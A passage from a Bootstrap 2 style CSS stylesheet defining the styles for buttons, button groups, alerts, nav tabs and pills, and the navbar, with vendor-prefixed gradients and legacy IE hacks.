	padding: 3;
	cursor: pointer;
	background: transparent;
	border: 0;
	-webkit-appearance: none;
}
.alert-options {
	float: right;
	line-height: 18px;
	color: #000;
	text-shadow: 0 1px 0 #ffffff;
	opacity: 0.2;
	filter: alpha(opacity=20);
}
.alert-options:hover,
.alert-options:focus {
	color: #000;
	text-decoration: none;
	cursor: pointer;
	opacity: 0.4;
	filter: alpha(opacity=40);
}
.btn {
	display: inline-block;
	*display: inline;
	*zoom: 1;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 13px;
	line-height: 18px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	color: #333;
	text-shadow: 0 1px 1px rgba(255,255,255,0.75);
	background-color: #f5f5f5;
	background-image: -moz-linear-gradient(top,#fff,#e6e6e6);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#fff),to(#e6e6e6));
	background-image: -webkit-linear-gradient(top,#fff,#e6e6e6);
	background-image: -o-linear-gradient(top,#fff,#e6e6e6);
	background-image: linear-gradient(to bottom,#fff,#e6e6e6);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#ffe5e5e5', GradientType=0);
	border-color: #e6e6e6 #e6e6e6 #bfbfbf;
	*background-color: #e6e6e6;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
	border: 1px solid #bbb;
	*border: 0;
	border-bottom-color: #a2a2a2;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	*margin-left: .3em;
	-webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	-moz-box-shadow: inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	box-shadow: inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
}
.btn:hover,
.btn:focus,
.btn:active,
.btn.active,
.btn.disabled,
.btn[disabled] {
	color: #333;
	background-color: #e6e6e6;
	*background-color: #d9d9d9;
}
.btn:active,
.btn.active {
	background-color: #cccccc \9;
}
.btn:first-child {
	*margin-left: 0;
}
.btn:hover,
.btn:focus {
	color: #333;
	text-decoration: none;
	background-position: 0 -15px;
	-webkit-transition: background-position .1s linear;
	-moz-transition: background-position .1s linear;
	-o-transition: background-position .1s linear;
	transition: background-position .1s linear;
}
.btn:focus {
	outline: thin dotted #333;
	outline: 5px auto -webkit-focus-ring-color;
	outline-offset: -2px;
}
.btn.active,
.btn:active {
	background-image: none;
	outline: 0;
	-webkit-box-shadow: inset 0 2px 4px rgba(0,0,0,.15), 0 1px 2px rgba(0,0,0,.05);
	-moz-box-shadow: inset 0 2px 4px rgba(0,0,0,.15), 0 1px 2px rgba(0,0,0,.05);
	box-shadow: inset 0 2px 4px rgba(0,0,0,.15), 0 1px 2px rgba(0,0,0,.05);
}
.btn.disabled,
.btn[disabled] {
	cursor: default;
	background-image: none;
	opacity: 0.65;
	filter: alpha(opacity=65);
	-webkit-box-shadow: none;
	-moz-box-shadow: none;
	box-shadow: none;
}
.btn-large {
	padding: 11px 19px;
	font-size: 16.25px;
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
}
.btn-large [class^="icon-"],
.btn-large [class*=" icon-"] {
	margin-top: 4px;
}
.btn-small {
	padding: 2px 10px;
	font-size: 12px;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border-radius: 3px;
}
.btn-small [class^="icon-"],
.btn-small [class*=" icon-"] {
	margin-top: 0;
}
.btn-mini [class^="icon-"],
.btn-mini [class*=" icon-"] {
	margin-top: -1px;
}
.btn-mini {
	padding: 0 6px;
	font-size: 9.75px;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border-radius: 3px;
}
.btn-block {
	display: block;
	width: 100%;
	padding-left: 0;
	padding-right: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
}
.btn-block + .btn-block {
	margin-top: 5px;
}
input[type="submit"].btn-block,
input[type="reset"].btn-block,
input[type="button"].btn-block {
	width: 100%;
}
.btn-primary.active,
.btn-warning.active,
.btn-danger.active,
.btn-success.active,
.btn-info.active,
.btn-inverse.active {
	color: rgba(255,255,255,0.75);
}
.btn-primary {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #1d6cb0;
	background-image: -moz-linear-gradient(top,#2384d3,#15497c);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#2384d3),to(#15497c));
	background-image: -webkit-linear-gradient(top,#2384d3,#15497c);
	background-image: -o-linear-gradient(top,#2384d3,#15497c);
	background-image: linear-gradient(to bottom,#2384d3,#15497c);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff2384d3', endColorstr='#ff15497c', GradientType=0);
	border-color: #15497c #15497c #0a223b;
	*background-color: #15497c;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.btn-primary:hover,
.btn-primary:focus,
.btn-primary:active,
.btn-primary.active,
.btn-primary.disabled,
.btn-primary[disabled] {
	color: #fff;
	background-color: #15497c;
	*background-color: #113c66;
}
.btn-primary:active,
.btn-primary.active {
	background-color: #0e2f50 \9;
}
.btn-warning {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #e48806;
	background-image: -moz-linear-gradient(top,#f89406,#c67605);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#f89406),to(#c67605));
	background-image: -webkit-linear-gradient(top,#f89406,#c67605);
	background-image: -o-linear-gradient(top,#f89406,#c67605);
	background-image: linear-gradient(to bottom,#f89406,#c67605);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff89406', endColorstr='#ffc67604', GradientType=0);
	border-color: #c67605 #c67605 #7c4a03;
	*background-color: #c67605;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.btn-warning:hover,
.btn-warning:focus,
.btn-warning:active,
.btn-warning.active,
.btn-warning.disabled,
.btn-warning[disabled] {
	color: #fff;
	background-color: #c67605;
	*background-color: #ad6704;
}
.btn-warning:active,
.btn-warning.active {
	background-color: #945904 \9;
}
.btn-danger {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #ad312b;
	background-image: -moz-linear-gradient(top,#bd362f,#942a25);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#bd362f),to(#942a25));
	background-image: -webkit-linear-gradient(top,#bd362f,#942a25);
	background-image: -o-linear-gradient(top,#bd362f,#942a25);
	background-image: linear-gradient(to bottom,#bd362f,#942a25);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffbd362f', endColorstr='#ff942a24', GradientType=0);
	border-color: #942a25 #942a25 #571916;
	*background-color: #942a25;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.btn-danger:hover,
.btn-danger:focus,
.btn-danger:active,
.btn-danger.active,
.btn-danger.disabled,
.btn-danger[disabled] {
	color: #fff;
	background-color: #942a25;
	*background-color: #802420;
}
.btn-danger:active,
.btn-danger.active {
	background-color: #6b1f1b \9;
}
.btn-success {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #409740;
	background-image: -moz-linear-gradient(top,#46a546,#378137);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#46a546),to(#378137));
	background-image: -webkit-linear-gradient(top,#46a546,#378137);
	background-image: -o-linear-gradient(top,#46a546,#378137);
	background-image: linear-gradient(to bottom,#46a546,#378137);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff46a546', endColorstr='#ff368136', GradientType=0);
	border-color: #378137 #378137 #204b20;
	*background-color: #378137;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.btn-success:hover,
.btn-success:focus,
.btn-success:active,
.btn-success.active,
.btn-success.disabled,
.btn-success[disabled] {
	color: #fff;
	background-color: #378137;
	*background-color: #2f6f2f;
}
.btn-success:active,
.btn-success.active {
	background-color: #285d28 \9;
}
.btn-info {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #2b89a4;
	background-image: -moz-linear-gradient(top,#2f96b4,#24748c);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#2f96b4),to(#24748c));
	background-image: -webkit-linear-gradient(top,#2f96b4,#24748c);
	background-image: -o-linear-gradient(top,#2f96b4,#24748c);
	background-image: linear-gradient(to bottom,#2f96b4,#24748c);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff2f96b4', endColorstr='#ff24748b', GradientType=0);
	border-color: #24748c #24748c #15424f;
	*background-color: #24748c;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.btn-info:hover,
.btn-info:focus,
.btn-info:active,
.btn-info.active,
.btn-info.disabled,
.btn-info[disabled] {
	color: #fff;
	background-color: #24748c;
	*background-color: #1f6377;
}
.btn-info:active,
.btn-info.active {
	background-color: #1a5363 \9;
}
.btn-inverse {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #363636;
	background-image: -moz-linear-gradient(top,#444,#222);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#444),to(#222));
	background-image: -webkit-linear-gradient(top,#444,#222);
	background-image: -o-linear-gradient(top,#444,#222);
	background-image: linear-gradient(to bottom,#444,#222);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff444444', endColorstr='#ff222222', GradientType=0);
	border-color: #222 #222 #000000;
	*background-color: #222;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.btn-inverse:hover,
.btn-inverse:focus,
.btn-inverse:active,
.btn-inverse.active,
.btn-inverse.disabled,
.btn-inverse[disabled] {
	color: #fff;
	background-color: #222;
	*background-color: #151515;
}
.btn-inverse:active,
.btn-inverse.active {
	background-color: #090909 \9;
}
button.btn,
input[type="submit"].btn {
	*padding-top: 3px;
	*padding-bottom: 3px;
}
button.btn::-moz-focus-inner,
input[type="submit"].btn::-moz-focus-inner {
	padding: 0;
	border: 0;
}
button.btn.btn-large,
input[type="submit"].btn.btn-large {
	*padding-top: 7px;
	*padding-bottom: 7px;
}
button.btn.btn-small,
input[type="submit"].btn.btn-small {
	*padding-top: 3px;
	*padding-bottom: 3px;
}
button.btn.btn-mini,
input[type="submit"].btn.btn-mini {
	*padding-top: 1px;
	*padding-bottom: 1px;
}
.btn-link,
.btn-link:active,
.btn-link[disabled] {
	background-color: transparent;
	background-image: none;
	-webkit-box-shadow: none;
	-moz-box-shadow: none;
	box-shadow: none;
}
.btn-link {
	border-color: transparent;
	cursor: pointer;
	color: #3071a9;
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.btn-link:hover,
.btn-link:focus {
	color: #1f496e;
	text-decoration: underline;
	background-color: transparent;
}
.btn-link[disabled]:hover,
.btn-link[disabled]:focus {
	color: #333;
	text-decoration: none;
}
.btn-group {
	position: relative;
	display: inline-block;
	*display: inline;
	*zoom: 1;
	font-size: 0;
	vertical-align: middle;
	white-space: nowrap;
	*margin-left: .3em;
}
.btn-group:first-child {
	*margin-left: 0;
}
.btn-group + .btn-group {
	margin-left: 5px;
}
.btn-toolbar {
	font-size: 0;
	margin-top: 9px;
	margin-bottom: 9px;
}
.btn-toolbar > .btn + .btn,
.btn-toolbar > .btn-group + .btn,
.btn-toolbar > .btn + .btn-group {
	margin-left: 5px;
}
.btn-group > .btn {
	position: relative;
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.btn-group > .btn + .btn {
	margin-left: -1px;
}
.btn-group > .btn,
.btn-group > .dropdown-menu,
.btn-group > .popover {
	font-size: 13px;
}
.btn-group > .btn-mini {
	font-size: 9.75px;
}
.btn-group > .btn-small {
	font-size: 12px;
}
.btn-group > .btn-large {
	font-size: 16.25px;
}
.btn-group > .btn:first-child {
	margin-left: 0;
	-webkit-border-top-left-radius: 4px;
	-moz-border-radius-topleft: 4px;
	border-top-left-radius: 4px;
	-webkit-border-bottom-left-radius: 4px;
	-moz-border-radius-bottomleft: 4px;
	border-bottom-left-radius: 4px;
}
.btn-group > .btn:last-child,
.btn-group > .dropdown-toggle {
	-webkit-border-top-right-radius: 4px;
	-moz-border-radius-topright: 4px;
	border-top-right-radius: 4px;
	-webkit-border-bottom-right-radius: 4px;
	-moz-border-radius-bottomright: 4px;
	border-bottom-right-radius: 4px;
}
.btn-group > .btn.large:first-child {
	margin-left: 0;
	-webkit-border-top-left-radius: 6px;
	-moz-border-radius-topleft: 6px;
	border-top-left-radius: 6px;
	-webkit-border-bottom-left-radius: 6px;
	-moz-border-radius-bottomleft: 6px;
	border-bottom-left-radius: 6px;
}
.btn-group > .btn.large:last-child,
.btn-group > .large.dropdown-toggle {
	-webkit-border-top-right-radius: 6px;
	-moz-border-radius-topright: 6px;
	border-top-right-radius: 6px;
	-webkit-border-bottom-right-radius: 6px;
	-moz-border-radius-bottomright: 6px;
	border-bottom-right-radius: 6px;
}
.btn-group > .btn:hover,
.btn-group > .btn:focus,
.btn-group > .btn:active,
.btn-group > .btn.active {
	z-index: 2;
}
.btn-group .dropdown-toggle:active,
.btn-group.open .dropdown-toggle {
	outline: 0;
}
.btn-group > .btn + .dropdown-toggle {
	padding-left: 8px;
	padding-right: 8px;
	-webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.125), inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	-moz-box-shadow: inset 1px 0 0 rgba(255,255,255,.125), inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	box-shadow: inset 1px 0 0 rgba(255,255,255,.125), inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	*padding-top: 5px;
	*padding-bottom: 5px;
}
.btn-group > .btn-mini + .dropdown-toggle {
	padding-left: 5px;
	padding-right: 5px;
	*padding-top: 2px;
	*padding-bottom: 2px;
}
.btn-group > .btn-small + .dropdown-toggle {
	*padding-top: 5px;
	*padding-bottom: 4px;
}
.btn-group > .btn-large + .dropdown-toggle {
	padding-left: 12px;
	padding-right: 12px;
	*padding-top: 7px;
	*padding-bottom: 7px;
}
.btn-group.open .dropdown-toggle {
	background-image: none;
	-webkit-box-shadow: inset 0 2px 4px rgba(0,0,0,.15), 0 1px 2px rgba(0,0,0,.05);
	-moz-box-shadow: inset 0 2px 4px rgba(0,0,0,.15), 0 1px 2px rgba(0,0,0,.05);
	box-shadow: inset 0 2px 4px rgba(0,0,0,.15), 0 1px 2px rgba(0,0,0,.05);
}
.btn-group.open .btn.dropdown-toggle {
	background-color: #e6e6e6;
}
.btn-group.open .btn-primary.dropdown-toggle {
	background-color: #15497c;
}
.btn-group.open .btn-warning.dropdown-toggle {
	background-color: #c67605;
}
.btn-group.open .btn-danger.dropdown-toggle {
	background-color: #942a25;
}
.btn-group.open .btn-success.dropdown-toggle {
	background-color: #378137;
}
.btn-group.open .btn-info.dropdown-toggle {
	background-color: #24748c;
}
.btn-group.open .btn-inverse.dropdown-toggle {
	background-color: #222;
}
.btn .caret {
	margin-top: 8px;
	margin-left: 0;
}
.btn-large .caret {
	margin-top: 6px;
}
.btn-large .caret {
	border-left-width: 5px;
	border-right-width: 5px;
	border-top-width: 5px;
}
.btn-mini .caret,
.btn-small .caret {
	margin-top: 8px;
}
.dropup .btn-large .caret {
	border-bottom-width: 5px;
}
.btn-primary .caret,
.btn-warning .caret,
.btn-danger .caret,
.btn-info .caret,
.btn-success .caret,
.btn-inverse .caret {
	border-top-color: #fff;
	border-bottom-color: #fff;
}
.btn-group-vertical {
	display: inline-block;
	*display: inline;
	*zoom: 1;
}
.btn-group-vertical > .btn {
	display: block;
	float: none;
	max-width: 100%;
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.btn-group-vertical > .btn + .btn {
	margin-left: 0;
	margin-top: -1px;
}
.btn-group-vertical > .btn:first-child {
	-webkit-border-radius: 4px 4px 0 0;
	-moz-border-radius: 4px 4px 0 0;
	border-radius: 4px 4px 0 0;
}
.btn-group-vertical > .btn:last-child {
	-webkit-border-radius: 0 0 4px 4px;
	-moz-border-radius: 0 0 4px 4px;
	border-radius: 0 0 4px 4px;
}
.btn-group-vertical > .btn-large:first-child {
	-webkit-border-radius: 6px 6px 0 0;
	-moz-border-radius: 6px 6px 0 0;
	border-radius: 6px 6px 0 0;
}
.btn-group-vertical > .btn-large:last-child {
	-webkit-border-radius: 0 0 6px 6px;
	-moz-border-radius: 0 0 6px 6px;
	border-radius: 0 0 6px 6px;
}
.alert {
	padding: 8px 35px 8px 14px;
	margin-bottom: 18px;
	text-shadow: 0 1px 0 rgba(255,255,255,0.5);
	background-color: #fcf8e3;
	border: 1px solid #faebcc;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.alert,
.alert h4 {
	color: #8a6d3b;
}
.alert h4 {
	margin: 0 0 .5em;
}
.alert .close {
	position: relative;
	top: -2px;
	right: -21px;
	line-height: 18px;
}
.alert-success {
	background-color: #dff0d8;
	border-color: #d6e9c6;
	color: #3c763d;
}
.alert-success h4 {
	color: #3c763d;
}
.alert-danger,
.alert-error {
	background-color: #f2dede;
	border-color: #ebccd1;
	color: #a94442;
}
.alert-danger h4,
.alert-error h4 {
	color: #a94442;
}
.alert-info {
	background-color: #d9edf7;
	border-color: #bce8f1;
	color: #31708f;
}
.alert-info h4 {
	color: #31708f;
}
.alert-block {
	padding-top: 14px;
	padding-bottom: 14px;
}
.alert-block > p,
.alert-block > ul {
	margin-bottom: 0;
}
.alert-block p + p {
	margin-top: 5px;
}
.nav {
	margin-left: 0;
	margin-bottom: 18px;
	list-style: none;
}
.nav > li > a {
	display: block;
}
.nav > li > a:hover,
.nav > li > a:focus {
	text-decoration: none;
	background-color: #eee;
}
.nav > li > a > img {
	max-width: none;
}
.nav > .pull-right {
	float: right;
}
.nav-header {
	display: block;
	padding: 3px 15px;
	font-size: 11px;
	font-weight: bold;
	line-height: 18px;
	color: #999;
	text-shadow: 0 1px 0 rgba(255,255,255,0.5);
	text-transform: uppercase;
}
.nav li + .nav-header {
	margin-top: 9px;
}
.nav-list {
	padding-left: 15px;
	padding-right: 15px;
	margin-bottom: 0;
}
.nav-list > li > a,
.nav-list .nav-header {
	margin-left: -15px;
	margin-right: -15px;
	text-shadow: 0 1px 0 rgba(255,255,255,0.5);
}
.nav-list > li > a {
	padding: 3px 15px;
}
.nav-list > .active > a,
.nav-list > .active > a:hover,
.nav-list > .active > a:focus {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.2);
	background-color: #3071a9;
}
.nav-list [class^="icon-"],
.nav-list [class*=" icon-"] {
	margin-right: 2px;
}
.nav-list .divider {
	*width: 100%;
	height: 1px;
	margin: 8px 1px;
	*margin: -5px 0 5px;
	overflow: hidden;
	background-color: #e5e5e5;
	border-bottom: 1px solid #fff;
}
.nav-tabs,
.nav-pills {
	*zoom: 1;
}
.nav-tabs:before,
.nav-tabs:after,
.nav-pills:before,
.nav-pills:after {
	display: table;
	content: "";
	line-height: 0;
}
.nav-tabs:after,
.nav-pills:after {
	clear: both;
}
.nav-tabs > li,
.nav-pills > li {
	float: left;
}
.nav-tabs > li > a,
.nav-pills > li > a {
	padding-right: 12px;
	padding-left: 12px;
	margin-right: 2px;
	line-height: 14px;
}
.nav-tabs {
	border-bottom: 1px solid #ddd;
}
.nav-tabs > li {
	margin-bottom: -1px;
}
.nav-tabs > li > a {
	padding-top: 8px;
	padding-bottom: 8px;
	line-height: 18px;
	border: 1px solid transparent;
	-webkit-border-radius: 4px 4px 0 0;
	-moz-border-radius: 4px 4px 0 0;
	border-radius: 4px 4px 0 0;
}
.nav-tabs > li > a:hover,
.nav-tabs > li > a:focus {
	border-color: #eee #eee #ddd;
}
.nav-tabs > .active > a,
.nav-tabs > .active > a:hover,
.nav-tabs > .active > a:focus {
	color: #555;
	background-color: #fff;
	border: 1px solid #ddd;
	border-bottom-color: transparent;
	cursor: default;
}
.nav-pills > li > a {
	padding-top: 8px;
	padding-bottom: 8px;
	margin-top: 2px;
	margin-bottom: 2px;
	-webkit-border-radius: 5px;
	-moz-border-radius: 5px;
	border-radius: 5px;
}
.nav-pills > .active > a,
.nav-pills > .active > a:hover,
.nav-pills > .active > a:focus {
	color: #fff;
	background-color: #3071a9;
}
.nav-stacked > li {
	float: none;
}
.nav-stacked > li > a {
	margin-right: 0;
}
.nav-tabs.nav-stacked {
	border-bottom: 0;
}
.nav-tabs.nav-stacked > li > a {
	border: 1px solid #ddd;
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.nav-tabs.nav-stacked > li:first-child > a {
	-webkit-border-top-right-radius: 4px;
	-moz-border-radius-topright: 4px;
	border-top-right-radius: 4px;
	-webkit-border-top-left-radius: 4px;
	-moz-border-radius-topleft: 4px;
	border-top-left-radius: 4px;
}
.nav-tabs.nav-stacked > li:last-child > a {
	-webkit-border-bottom-right-radius: 4px;
	-moz-border-radius-bottomright: 4px;
	border-bottom-right-radius: 4px;
	-webkit-border-bottom-left-radius: 4px;
	-moz-border-radius-bottomleft: 4px;
	border-bottom-left-radius: 4px;
}
.nav-tabs.nav-stacked > li > a:hover,
.nav-tabs.nav-stacked > li > a:focus {
	border-color: #ddd;
	z-index: 2;
}
.nav-pills.nav-stacked > li > a {
	margin-bottom: 3px;
}
.nav-pills.nav-stacked > li:last-child > a {
	margin-bottom: 1px;
}
.nav-tabs .dropdown-menu {
	-webkit-border-radius: 0 0 6px 6px;
	-moz-border-radius: 0 0 6px 6px;
	border-radius: 0 0 6px 6px;
}
.nav-pills .dropdown-menu {
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
}
.nav .dropdown-toggle .caret {
	border-top-color: #3071a9;
	border-bottom-color: #3071a9;
	margin-top: 6px;
}
.nav .dropdown-toggle:hover .caret,
.nav .dropdown-toggle:focus .caret {
	border-top-color: #1f496e;
	border-bottom-color: #1f496e;
}
.nav-tabs .dropdown-toggle .caret {
	margin-top: 8px;
}
.nav .active .dropdown-toggle .caret {
	border-top-color: #fff;
	border-bottom-color: #fff;
}
.nav-tabs .active .dropdown-toggle .caret {
	border-top-color: #555;
	border-bottom-color: #555;
}
.nav > .dropdown.active > a:hover,
.nav > .dropdown.active > a:focus {
	cursor: pointer;
}
.nav-tabs .open .dropdown-toggle,
.nav-pills .open .dropdown-toggle,
.nav > li.dropdown.open.active > a:hover,
.nav > li.dropdown.open.active > a:focus {
	color: #fff;
	background-color: #999;
	border-color: #999;
}
.nav li.dropdown.open .caret,
.nav li.dropdown.open.active .caret,
.nav li.dropdown.open a:hover .caret,
.nav li.dropdown.open a:focus .caret {
	border-top-color: #fff;
	border-bottom-color: #fff;
	opacity: 1;
	filter: alpha(opacity=100);
}
.tabs-stacked .open > a:hover,
.tabs-stacked .open > a:focus {
	border-color: #999;
}
.tabbable {
	*zoom: 1;
}
.tabbable:before,
.tabbable:after {
	display: table;
	content: "";
	line-height: 0;
}
.tabbable:after {
	clear: both;
}
.tab-content {
	overflow: auto;
}
.tabs-below > .nav-tabs,
.tabs-right > .nav-tabs,
.tabs-left > .nav-tabs {
	border-bottom: 0;
}
.tab-content > .tab-pane,
.pill-content > .pill-pane {
	display: none;
}
.tab-content > .active,
.pill-content > .active {
	display: block;
}
.tabs-below > .nav-tabs {
	border-top: 1px solid #ddd;
}
.tabs-below > .nav-tabs > li {
	margin-top: -1px;
	margin-bottom: 0;
}
.tabs-below > .nav-tabs > li > a {
	-webkit-border-radius: 0 0 4px 4px;
	-moz-border-radius: 0 0 4px 4px;
	border-radius: 0 0 4px 4px;
}
.tabs-below > .nav-tabs > li > a:hover,
.tabs-below > .nav-tabs > li > a:focus {
	border-bottom-color: transparent;
	border-top-color: #ddd;
}
.tabs-below > .nav-tabs > .active > a,
.tabs-below > .nav-tabs > .active > a:hover,
.tabs-below > .nav-tabs > .active > a:focus {
	border-color: transparent #ddd #ddd #ddd;
}
.tabs-left > .nav-tabs > li,
.tabs-right > .nav-tabs > li {
	float: none;
}
.tabs-left > .nav-tabs > li > a,
.tabs-right > .nav-tabs > li > a {
	min-width: 74px;
	margin-right: 0;
	margin-bottom: 3px;
}
.tabs-left > .nav-tabs {
	float: left;
	margin-right: 19px;
	border-right: 1px solid #ddd;
}
.tabs-left > .nav-tabs > li > a {
	margin-right: -1px;
	-webkit-border-radius: 4px 0 0 4px;
	-moz-border-radius: 4px 0 0 4px;
	border-radius: 4px 0 0 4px;
}
.tabs-left > .nav-tabs > li > a:hover,
.tabs-left > .nav-tabs > li > a:focus {
	border-color: #eee #ddd #eee #eee;
}
.tabs-left > .nav-tabs .active > a,
.tabs-left > .nav-tabs .active > a:hover,
.tabs-left > .nav-tabs .active > a:focus {
	border-color: #ddd transparent #ddd #ddd;
	*border-right-color: #fff;
}
.tabs-right > .nav-tabs {
	float: right;
	margin-left: 19px;
	border-left: 1px solid #ddd;
}
.tabs-right > .nav-tabs > li > a {
	margin-left: -1px;
	-webkit-border-radius: 0 4px 4px 0;
	-moz-border-radius: 0 4px 4px 0;
	border-radius: 0 4px 4px 0;
}
.tabs-right > .nav-tabs > li > a:hover,
.tabs-right > .nav-tabs > li > a:focus {
	border-color: #eee #eee #eee #ddd;
}
.tabs-right > .nav-tabs .active > a,
.tabs-right > .nav-tabs .active > a:hover,
.tabs-right > .nav-tabs .active > a:focus {
	border-color: #ddd #ddd #ddd transparent;
	*border-left-color: #fff;
}
.nav > .disabled > a {
	color: #999;
}
.nav > .disabled > a:hover,
.nav > .disabled > a:focus {
	text-decoration: none;
	background-color: transparent;
	cursor: default;
}
.navbar {
	overflow: visible;
	margin-bottom: 18px;
	*position: relative;
	*z-index: 2;
}
.navbar-inner {
	min-height: 40px;
	padding-left: 20px;
	padding-right: 20px;
	background-color: #fafafa;
	background-image: -moz-linear-gradient(top,#ffffff,#f2f2f2);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#ffffff),to(#f2f2f2));
	background-image: -webkit-linear-gradient(top,#ffffff,#f2f2f2);
	background-image: -o-linear-gradient(top,#ffffff,#f2f2f2);
	background-image: linear-gradient(to bottom,#ffffff,#f2f2f2);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#fff2f2f2', GradientType=0);
	border: 1px solid #d4d4d4;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-shadow: 0 1px 4px rgba(0,0,0,0.065);
	-moz-box-shadow: 0 1px 4px rgba(0,0,0,0.065);
	box-shadow: 0 1px 4px rgba(0,0,0,0.065);
	*zoom: 1;
}
.navbar-inner:before,
.navbar-inner:after {
	display: table;
	content: "";
	line-height: 0;
}
.navbar-inner:after {
	clear: both;
}
.navbar .container {
	width: auto;
}
.nav-collapse.collapse {
	height: auto;
	overflow: visible;
}
.navbar .brand {
	float: left;
	display: block;
	padding: 11px 20px 11px;
	margin-left: -20px;
	font-size: 20px;
	font-weight: 200;
	color: #555;
	text-shadow: 0 1px 0 #ffffff;
}
.navbar .brand:hover,
.navbar .brand:focus {
	text-decoration: none;
}
.navbar-text {
	margin-bottom: 0;
	line-height: 40px;
	color: #555;
}
.navbar-link {
	color: #555;
}
.navbar-link:hover,
.navbar-link:focus {
	color: #333;
}
.navbar .divider-vertical {
	height: 40px;
	margin: 0 9px;
	border-left: 1px solid #f2f2f2;
	border-right: 1px solid #ffffff;
}
.navbar .btn,
.navbar .btn-group {
	margin-top: 5px;
}
.navbar .btn-group .btn,
.navbar .input-prepend .btn,
.navbar .input-append .btn,
.navbar .input-prepend .btn-group,
.navbar .input-append .btn-group {
	margin-top: 0;
}
.navbar-form {
	margin-bottom: 0;
	*zoom: 1;
}
.navbar-form:before,
.navbar-form:after {
	display: table;
	content: "";
	line-height: 0;
}
.navbar-form:after {
	clear: both;
}
.navbar-form input,
.navbar-form select,
.navbar-form .radio,
.navbar-form .checkbox {
	margin-top: 5px;
}
.navbar-form input,
.navbar-form select,
.navbar-form .btn {
	display: inline-block;
	margin-bottom: 0;
}
.navbar-form input[type="image"],
.navbar-form input[type="checkbox"],
.navbar-form input[type="radio"] {
	margin-top: 3px;
}
.navbar-form .input-append,
.navbar-form .input-prepend {
	margin-top: 5px;
	white-space: nowrap;
}
.navbar-form .input-append input,
.navbar-form .input-prepend input {
	margin-top: 0;
}
.navbar-search {
	position: relative;
	float: left;
	margin-top: 5px;
	margin-bottom: 0;
}
.navbar-search .search-query {
	margin-bottom: 0;
	padding: 4px 14px;
	font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
	font-size: 13px;
	font-weight: normal;
	line-height: 1;
	-webkit-border-radius: 15px;
	-moz-border-radius: 15px;
	border-radius: 15px;
}
.navbar-static-top {
	position: static;
	margin-bottom: 0;
}
.navbar-static-top .navbar-inner {
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.navbar-fixed-top,
.navbar-fixed-bottom {
	position: fixed;
	right: 0;
	left: 0;
	z-index: 1030;
	margin-bottom: 0;
}
.navbar-fixed-top .navbar-inner,
.navbar-static-top .navbar-inner {
	border-width: 0 0 1px;
}
.navbar-fixed-bottom .navbar-inner {
	border-width: 1px 0 0;
}
.navbar-fixed-top .navbar-inner,
.navbar-fixed-bottom .navbar-inner {
	padding-left: 0;
	padding-right: 0;
	-webkit-border-radius: 0;
